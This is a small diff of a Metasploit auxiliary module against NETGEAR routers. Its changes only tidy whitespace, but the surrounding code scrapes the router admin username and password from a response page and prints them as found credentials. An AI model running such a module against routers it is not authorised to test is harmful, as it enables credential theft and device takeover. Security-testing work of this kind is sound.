@@ -52,7 +52,6 @@ class MetasploitModule < Msf::Auxiliary
   def run
     rhost = datastore['RHOST']
     print_status("Checking if #{rhost} is a NETGEAR router")
-    
     vprint_status("Sending request to http://#{rhost}/")
 
     # will always call check no matter what
@@ -76,7 +75,7 @@ class MetasploitModule < Msf::Auxiliary
         username = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Username</td><td class=\"MNUText\" align=\"left\">", "</td>")
         password = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Password</td><td class=\"MNUText\" align=\"left\">", "</td>")
         print_good("Creds found: #{username}/#{password}")
-      else 
+      else
         print_error("#{rhost} is not vulnerable because password recovery is on.")
       end
     else
@@ -89,7 +88,6 @@ class MetasploitModule < Msf::Auxiliary
   #This checks the response dor that header.
   def check                             #NOTE: this is working
     res = send_request_raw({'uri'=>'/'})
-    
     unless res
       fail_with(Failure::Unknown, 'Connection timed out.')
     end
